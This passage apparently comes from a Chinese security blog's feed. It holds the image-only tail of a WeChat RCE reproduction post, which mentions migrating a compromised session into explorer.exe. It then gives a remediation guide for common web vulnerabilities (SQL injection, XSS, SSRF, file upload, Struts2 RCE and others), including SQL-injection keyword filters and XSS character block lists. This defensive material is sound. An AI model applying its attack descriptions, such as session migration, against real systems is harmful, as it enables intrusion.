src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%BE%AE%E4%BF%A18.webp" alt="image"></p><h3 id="而转移到explorer-exe的会话依然坚挺！"><a href="#而转移到explorer-exe的会话依然坚挺！" class="headerlink" title="而转移到explorer.exe的会话依然坚挺！"></a>而转移到explorer.exe的会话依然坚挺！</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E4%B8%8A%E5%8F%B7.webp" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 微信rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web常见漏洞描述及修复建议</title>
      <link href="2021/04/16/Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%E5%8F%8A%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/"/>
      <url>2021/04/16/Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%E5%8F%8A%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。</p><p>  （1）使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p><p>  （2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。</p><p>  （3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。</p><p>  （4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。</p><p>  （5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p><p>  （6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</p><p>  （7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p><p>  （8）过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　1、Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML/JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。</p><p>　　2、XSS攻击对Web服务器本身虽无直接危害，但是它借助网站进行传播，对网站用户进行攻击，窃取网站用户账号身份信息等，从而也会对网站产生较严重的威胁。</p><p>XSS攻击可导致以下危害：</p><p>　　1、钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术发起更高级的钓鱼攻击。</p><p>　　2、网站挂马：跨站时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上、或弹出恶意网站窗口等方式，进行挂马。</p><p>　　3、身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS攻击可以盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限。</p><p>　　4、盗取网站用户信息：当窃取到用户cookie从而获取到用户身份时，攻击者可以盗取到用户对网站的操作权限，从而查看用户隐私信息。</p><p>　　5、垃圾信息发送：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</p><p>　　6、劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等等。</p><p>　　7、XSS蠕虫：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、实施DDoS攻击等。</p><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义</p><p>  （1）过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” &lt; “，” &gt; “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。</p><p>  （2）不仅验证数据的类型，还要验证其格式、长度、范围和内容。</p><p>  （3）不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</p><p>  （4）对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。</p><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>漏洞详情<br>  参考：<a href="https://www.freebuf.com/company-information/165769.html">https://www.freebuf.com/company-information/165769.html</a><br>CSRF</p><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>　　CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。</p><h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、验证请求的Referer是否来自本网站，但可被绕过。</p><p>  2、在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。这个漏洞造成的危害有：</p><p>　　(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>　　(2)、攻击运行在内网或本地的应用程序（比如溢出）;</p><p>　　(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;</p><p>　　(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</p><p>　　(5)、利用File协议读取本地文件。</p><h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、禁用不需要的协议，只允许HTTP和HTTPS请求，可以防止类似于file://, gopher://, ftp:// 等引起的问题。</p><p>  2、白名单的方式限制访问的目标地址，禁止对内网发起请求</p><p>  3、过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>  4、验证请求的文件格式</p><p>  5、禁止跳转</p><p>  6、限制请求的端口为http常用的端口，比如 80、443、8080、8000等</p><p>  7、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><h1 id="任意命令-代码执行"><a href="#任意命令-代码执行" class="headerlink" title="任意命令/代码执行"></a>任意命令/代码执行</h1><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。攻击者可在服务器上执行任意命令，读写文件操作等，危害巨大。</p><h3 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、严格过滤用户输入的数据，禁止执行非预期系统命令。</p><p>  2、减少或不使用代码或命令执行函数</p><p>  3、客户端提交的变量在放入函数前进行检测</p><p>  4、减少或不使用危险函数</p><h1 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h1><h3 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。</p><h3 id="修复建议-5"><a href="#修复建议-5" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小等限制来防御，或是将上传的文件其他文件存储服务器中。</p><p>  2、严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关上传文件目录的执行权限，防止木马执行。</p><p>  3、对上传文件格式进行严格校验，防止上传恶意脚本文件；</p><p>  4、严格限制上传的文件路径。</p><p>  5、文件扩展名服务端白名单校验。</p><p>  6、文件内容服务端校验。</p><p>  7、上传文件重命名。</p><p>  8、隐藏上传文件路径。</p><h1 id="目录穿越-目录遍历"><a href="#目录穿越-目录遍历" class="headerlink" title="目录穿越/目录遍历"></a>目录穿越/目录遍历</h1><h3 id="漏洞描述-5"><a href="#漏洞描述-5" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符../跳出程序本身的限制目录，来下载或显示任意文件。</p><h3 id="修复建议-6"><a href="#修复建议-6" class="headerlink" title="修复建议"></a>修复建议</h3><p>对传入的文件名参数进行过滤，并且判断是否是允许获取的文件类型，过滤回溯符../。</p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h3 id="漏洞描述-6"><a href="#漏洞描述-6" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。</p><h3 id="修复建议-7"><a href="#修复建议-7" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、严格检查变量是否已经初始化。</p><p>  2、对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符。</p><p>  3、严格检查文件包含函数中的参数是否外界可控。</p><h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><h3 id="漏洞描述-7"><a href="#漏洞描述-7" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　由于网站用户帐号存在弱口令，导致攻击者通过弱口令可轻松登录到网站中，从而进行下一步的攻击，如上传webshell，获取敏感数据。</p><p>　　另外攻击者利用弱口令登录网站管理后台，可执行任意管理员的操作。</p><h3 id="修复建议-8"><a href="#修复建议-8" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、强制用户首次登录时修改默认口令，或是使用用户自定义初始密码的策略；</p><p>  2、完善密码策略，信息安全最佳实践的密码策略为8位（包括）以上字符，包含数字、大小写字母、特殊字符中的至少3种。</p><p>  3、增加人机验证机制，限制ip访问次数。</p><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h3 id="漏洞描述-8"><a href="#漏洞描述-8" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　由于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。</p><h3 id="修复建议-9"><a href="#修复建议-9" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险)</p><p>  2、如果某个 IP登录次数超过设置的阈值，则锁定IP</p><p>  3、增加人机验证机制</p><p>  4、验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。</p><h1 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h1><h3 id="漏洞描述-9"><a href="#漏洞描述-9" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。</p><h3 id="修复建议-10"><a href="#修复建议-10" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、对用户访问角色的权限进行严格的检查及限制。</p><p>  2、在一些操作时可以使用session对用户的身份进行判断和控制</p><h1 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h1><h3 id="漏洞描述-10"><a href="#漏洞描述-10" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。</p><h3 id="修复建议-11"><a href="#修复建议-11" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、页面进行严格的访问权限的控制以及对访问角色进行权限检查。</p><p>  2、可以使用session对用户的身份进行判断和控制。</p><h1 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h1><h3 id="漏洞描述-11"><a href="#漏洞描述-11" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　由于web服务器配置不当，开启了目录浏览，攻击者可获得服务器上的文件目录结构，获取敏感文件。</p><h3 id="修复建议-12"><a href="#修复建议-12" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、通过修改配置文件，禁止中间件（如IIS、apache、tomcat）的文件目录索引功能</p><p>  2、设置目录访问权限</p><h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h3 id="漏洞描述-12"><a href="#漏洞描述-12" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　php反序列化漏洞也叫PHP对象注入，形成原因为程序未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行、文件操作、执行数据库操作等不可控后果。这一类攻击在java、python等面向对象语言中均存在。</p><p>可参考：<a href="https://www.freebuf.com/articles/web/167721.html">https://www.freebuf.com/articles/web/167721.html</a></p><h3 id="修复建议-13"><a href="#修复建议-13" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、对传入的对象进行严格的过滤检查</p><p>  2、在反序列化过程执行的文件读写、命令或代码执行函数中是否有用户可控的参数。</p><h1 id="http-slow拒绝服务攻击"><a href="#http-slow拒绝服务攻击" class="headerlink" title="http slow拒绝服务攻击"></a>http slow拒绝服务攻击</h1><h3 id="漏洞描述-13"><a href="#漏洞描述-13" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　按照设计，HTTP协议要求服务器在处理之前完全接收请求。 如果HTTP请求没有完成，或者传输速率非常低，服务器会保持其资源忙于等待其余数据。如果服务器保持太多的资源请求和处理，这将造成一个拒绝服务。严重者一台主机即可让web运行缓慢甚至是崩溃。</p><h3 id="修复建议-14"><a href="#修复建议-14" class="headerlink" title="修复建议"></a>修复建议</h3><p>对于 Apache 可以做以下优化（其他服务器原理相同）：</p><pre><code>  1、设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率  2、增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13.Theold name is still supported.  3、默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满Apache的所有连接</code></pre><h1 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h1><h3 id="漏洞描述-14"><a href="#漏洞描述-14" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　CRLF 是“回车 +换行”（\r\n）的简称。在 HTTP 协议中，HTTPHeader 与 HTTP Body 是用两个 CRLF 符号进行分隔的，浏览器根据这两个 CRLF 符号来获取 HTTP 内容并显示。因此，一旦攻击者能够控制 HTTP 消息头中的字符，注入一些恶意的换行，就能注入一些会话 Cookie 或者 HTML 代码。</p><h3 id="修复建议-15"><a href="#修复建议-15" class="headerlink" title="修复建议"></a>修复建议</h3><p>1、过滤 \r 、\n 及其各种编码的换行符，避免输入的数据污染到其他 HTTP 消息头。</p><h1 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h1><h3 id="漏洞描述-15"><a href="#漏洞描述-15" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　由于Web 应用程序没有对用户发送的数据进行适当过滤和检查，攻击者可修改LDAP 语句的结构，并且以数据库服务器、Web 服务器等的权限执行任意命令，许可权可能会允许查询、修改或除去 LDAP 树状构造内任何数据。</p><h3 id="修复建议-16"><a href="#修复建议-16" class="headerlink" title="修复建议"></a>修复建议</h3><p>对用户的输入内容进行严格的过滤。</p><h1 id="URL-跳转"><a href="#URL-跳转" class="headerlink" title="URL 跳转"></a>URL 跳转</h1><h3 id="漏洞描述-16"><a href="#漏洞描述-16" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。</p><h3 id="修复建议-17"><a href="#修复建议-17" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、在进行页面跳转前校验传入的URL是否为可信域名。</p><p>  2、白名单规定跳转链接</p><h1 id="明文传输"><a href="#明文传输" class="headerlink" title="明文传输"></a>明文传输</h1><h3 id="漏洞描述-17"><a href="#漏洞描述-17" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　用户登录过程中使用明文传输用户登录信息，若用户遭受中间人攻击时，攻击者可直接获取该用户登录账户，从而进行进一步渗透。</p><h3 id="修复建议-18"><a href="#修复建议-18" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、用户登录信息使用加密传输，如密码在传输前使用安全的算法加密后传输，可采用的算法包括：不可逆hash算法加盐（4位及以上随机数，由服务器端产生）；安全对称加密算法，如AES(128、192、256位)，且必须保证客户端密钥安全，不可被破解或读出；非对称加密算法，如RSA(不低于1024位)、SM2等。</p><p>  2、使用https来保证传输的安全。</p><h1 id="网页木马"><a href="#网页木马" class="headerlink" title="网页木马"></a>网页木马</h1><h3 id="漏洞描述-18"><a href="#漏洞描述-18" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　经渗透测试发现目标站点存在webshell，攻击者可直接爆破口令使用木马，非常低成本的进行恶意操作。</p><h3 id="修复建议-19"><a href="#修复建议-19" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、确认并删除木马文件，并进行本地文件漏洞扫描排查是否还存在有其他木马。</p><p>  2、发现并及时修复已存在的漏洞。</p><p>  3、通过查看日志、服务器杀毒等安全排查，确保服务器未被留下后门</p><h1 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h1><h3 id="漏洞描述-19"><a href="#漏洞描述-19" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　网站备份文件或、敏感信息文件存放在某个网站目录下，攻击者可通过文件扫描等方法发现并下载该备份文件，导致网站敏感信息泄露。</p><h3 id="修复建议-20"><a href="#修复建议-20" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、不在网站目录下存放网站备份文件或敏感信息的文件。</p><p>  2、如需存放该类文件，请将文件名命名为难以猜解的无规则字符串。</p><h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><h3 id="漏洞描述-20"><a href="#漏洞描述-20" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。</p><h3 id="修复建议-21"><a href="#修复建议-21" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。</p><p>  2、不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。</p><p>  3、在服务器端对相关敏感信息进行模糊化处理。</p><p>  4、对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。</p><h1 id="短信-邮件轰炸"><a href="#短信-邮件轰炸" class="headerlink" title="短信/邮件轰炸"></a>短信/邮件轰炸</h1><h3 id="漏洞描述-21"><a href="#漏洞描述-21" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　由于没有对短信或者邮件发送次数进行限制，导致可无限次发送短信或邮件给用户，从而造成短信轰炸，进而可能被大量用户投诉，从而影响公司声誉。</p><h3 id="修复建议-22"><a href="#修复建议-22" class="headerlink" title="修复建议"></a>修复建议</h3><p>在服务器限制发送短信或邮件的频率，如同一账号1分钟只能发送1次短信或邮件，一天只能发送3次。</p><h1 id="phpinfo信息泄漏"><a href="#phpinfo信息泄漏" class="headerlink" title="phpinfo信息泄漏"></a>phpinfo信息泄漏</h1><h3 id="漏洞描述-22"><a href="#漏洞描述-22" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息，造成服务器信息泄露，为攻击提供有利的信息。</p><h3 id="修复建议-23"><a href="#修复建议-23" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、删除phpinfo 函数。</p><p>  2、若文件无用可直接删除。 </p><h1 id="IIS短文件名泄露漏洞"><a href="#IIS短文件名泄露漏洞" class="headerlink" title="IIS短文件名泄露漏洞"></a>IIS短文件名泄露漏洞</h1><h3 id="漏洞描述-23"><a href="#漏洞描述-23" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　Internet Information Services（IIS，互联网信息服务）是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。危害：攻击者可以利用“~”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。</p><p>　　攻击者可通过该漏洞尝试获取网站服务器文件的文件名，达到获取更多信息来入侵服务器的目的。</p><h3 id="修复建议-24"><a href="#修复建议-24" class="headerlink" title="修复建议"></a>修复建议</h3><p>修改Windows配置，关闭短文件名功能。</p><p>  1.关闭NTFS 8.3文件格式的支持。该功能默认是开启的，对于大多数用户来说无需开启。</p><p>  2.如果是虚拟主机空间用户,可采用以下修复方案：</p><pre><code>  1）修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)。  2）如果你的web环境不需要asp.net的支持你可以进入Internet 信息服务(IIS)管理器 --- Web 服务扩展 - ASP.NET 选择禁止此功能。  3）升级net framework 至4.0以上版本。  3.将web文件夹的内容拷贝到另一个位置，比如D:\www到D:\www.back，然后删除原文件夹D:\www，再重命名D:\www.back到D:\www。如果不重新复制，已经存在的短文件名则是不会消失的。</code></pre><h2 id="应用程序错误信息泄露"><a href="#应用程序错误信息泄露" class="headerlink" title="应用程序错误信息泄露"></a>应用程序错误信息泄露</h2><h3 id="漏洞描述-24"><a href="#漏洞描述-24" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　攻击者可通过特殊的攻击向量，使web服务器出现500、403等相关错误，导致信息泄漏如绝对路径、webserver版本、源代码、sql语句等敏感信息，恶意攻击者很有可能利用这些信息实施进一步的攻击。</p><h3 id="修复建议-25"><a href="#修复建议-25" class="headerlink" title="修复建议"></a>修复建议</h3><p>1、自定义错误页面或使用统一的错误页面提示。</p><h1 id="Apache-Tomcat默认文件"><a href="#Apache-Tomcat默认文件" class="headerlink" title="Apache Tomcat默认文件"></a>Apache Tomcat默认文件</h1><h3 id="漏洞描述-25"><a href="#漏洞描述-25" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　Apache Tomcat默认样例文件没有删除或限制访问，可能存在cookie、session伪造，进行后台登录操作</p><h3 id="修复建议-26"><a href="#修复建议-26" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、删除样例文件</p><p>  2、限制文件访问权限</p><h2 id="Crossdomain-xml-配置不当"><a href="#Crossdomain-xml-配置不当" class="headerlink" title="Crossdomain.xml 配置不当"></a>Crossdomain.xml 配置不当</h2><h3 id="漏洞描述-26"><a href="#漏洞描述-26" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　网站根目录下的 crossdomain.xml 文件指明了远程Flash 是否可以加载当前网站的资源（图片、网页内容、Flash等）。如果配置不当，可能导致遭受跨站请求伪造（CSRF）攻击。</p><h3 id="修复建议-27"><a href="#修复建议-27" class="headerlink" title="修复建议"></a>修复建议</h3><p>对于不需要从外部加载资源的网站，在 crossdomain.xml 文件中更改allow-access-from的domain属性为域名白名单。</p><h1 id="目标服务器启用了不安全-HTTP-方法"><a href="#目标服务器启用了不安全-HTTP-方法" class="headerlink" title="目标服务器启用了不安全 HTTP 方法"></a>目标服务器启用了不安全 HTTP 方法</h1><h3 id="漏洞描述-27"><a href="#漏洞描述-27" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　目标服务器启用了不安全的传输方法，如PUT、TRACE、DELETE、MOVE等，这些方法表示可能在服务器上使用了 WebDAV，由于dav方法允许客户端操纵服务器上的文件，如上传、修改、删除相关文件等危险操作，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件。</p><h3 id="修复建议-28"><a href="#修复建议-28" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、关闭不安全的传输方法，只开启POST、GET方法。</p><p>  2、如果服务器不使用 WebDAV 可直接禁用，或为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码。</p><h1 id="weblogic-SSRF服务器请求伪造"><a href="#weblogic-SSRF服务器请求伪造" class="headerlink" title="weblogic SSRF服务器请求伪造"></a>weblogic SSRF服务器请求伪造</h1><h3 id="漏洞描述-28"><a href="#漏洞描述-28" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　目标存在weblogic SSRF服务器请求伪造漏洞。WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。Weblogic中间件默认带有“UDDI 目录浏览器”且为未授权访问，通过该应用，可进行无回显的SSRF请求。攻击者可利用该漏洞对企业内网进行大规模扫描，了解内网结构，并可能结合内网漏洞直接获取服务器权限。</p><h3 id="修复建议-29"><a href="#修复建议-29" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、若不影响业务则可删除uddiexplorer文件夹</p><p>  2、限制uddiexplorer应用只能内网访问</p><h1 id="Apache-Struts2-远程代码执行漏洞（S2-019）"><a href="#Apache-Struts2-远程代码执行漏洞（S2-019）" class="headerlink" title="Apache Struts2 远程代码执行漏洞（S2-019）"></a>Apache Struts2 远程代码执行漏洞（S2-019）</h1><h3 id="漏洞描述-29"><a href="#漏洞描述-29" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　Apache Struts2的“Dynamic MethodInvocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，如果未关闭此机制将导致远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p><h3 id="修复建议-30"><a href="#修复建议-30" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1、目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载。</p><p>  2、或者手工设置struts.xml文件&lt;constantname=”struts.enable.DynamicMethodInvocation”value=”false”/&gt;</p><h1 id="Apache-Struts2-远程代码执行漏洞（S2-037）"><a href="#Apache-Struts2-远程代码执行漏洞（S2-037）" class="headerlink" title="Apache Struts2 远程代码执行漏洞（S2-037）"></a>Apache Struts2 远程代码执行漏洞（S2-037）</h1><h3 id="漏洞描述-30"><a href="#漏洞描述-30" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　Apache Struts2在使用REST插件时，攻击者可以绕过动态方法执行的限制，调用恶意表达式执行远程代码。</p><h3 id="修复建议-31"><a href="#修复建议-31" 